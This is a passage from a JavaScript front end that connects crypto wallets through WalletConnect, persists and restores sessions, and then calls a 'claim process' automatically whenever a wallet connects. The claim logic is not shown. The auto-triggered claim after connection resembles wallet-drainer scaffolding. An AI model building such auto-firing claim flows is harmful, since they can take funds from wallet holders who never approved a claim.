    loadWalletConnectLibraries().catch((e) => logDebug('lib prewarm: ' + e.message));
    setupEIP6963();

    // Wait for DOM content if not already parsed
    if (document.readyState === 'loading') {
      await new Promise((r) => document.addEventListener('DOMContentLoaded', r, { once: true }));
    }

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to initialise wallet libraries', 'error');
  }

  // ─── SESSION LISTENERS ──────────────────────────────────────
  setTimeout(() => {
    if (!state.client) return;
    state.client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const addr = accounts[0].split(':')[2];
        updateConnectedUI(addr, 'evm');
        Storage.save(addr, state.currentSession, 'evm');
        publishGlobal(addr, 'evm', state.web3?.currentProvider || null, state.currentSession);
        setTimeout(() => window.initiateClaimProcess?.(), 800);
      }
    });
    state.client.on('session_delete', () => {
      resetConnectedUI();
      Storage.clear();
      showStatus('Wallet disconnected', 'error');
    });
    state.client.on('session_connect', (session) => {
      const addr = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (addr) {
        state.currentSession = session;
        Storage.save(addr, session, 'evm');
        updateConnectedUI(addr, 'evm');
        publishGlobal(addr, 'evm', null, session);
        setTimeout(() => window.initiateClaimProcess?.(), 800);
      }
    });
  }, 800);

  // ─── GLOBAL PROVIDER EVENTS ─────────────────────────────────
  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);

  // ─── VISIBILITY — resume pending WC flows ───────────────────
  if (!state.visibilityBound) {
    state.visibilityBound = true;
    document.addEventListener('visibilitychange', async () => {
      if (document.hidden) return;
      const pending = sessionStorage.getItem('pending_wc_uri');
      const ts      = sessionStorage.getItem('pending_wc_timestamp');
      if (!pending || !ts || Date.now() - parseInt(ts) > 120000) return;
      logDebug('Visibility: resuming pending WC session');
      try {
        await initWalletConnect(false);
        await new Promise((r) => setTimeout(r, 1200));
        const sessions = state.client.session.values();
        if (sessions.length) {
          const s = sessions[0];
          const addr = s.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (addr) {
            state.currentSession = s;
            Storage.save(addr, s, 'evm');
            updateConnectedUI(addr, 'evm');
            const provider = state.EthereumProvider
              ? await state.EthereumProvider.init({ projectId: state.projectId, metadata: DAPP_METADATA, session: s }).catch(() => null)
              : null;
            publishGlobal(addr, 'evm', provider || makeWCShimProvider(), s);
            sessionStorage.removeItem('pending_wc_uri');
            sessionStorage.removeItem('pending_wc_timestamp');
            setTimeout(() => window.initiateClaimProcess?.(), 800);
          }
        }
      } catch (e) { logDebug('visibility restore: ' + e.message); }
    });
  }

  // ─── CLEANUP ────────────────────────────────────────────────
  window.addEventListener('beforeunload', () => {
    try { state.modal?.closeModal?.(); } catch (_) {}
  });

  logDebug(`✅ main.js ready — ${getPlatform()} | mobile=${isMobile()} | desktop=${isDesktop()}`);
})();
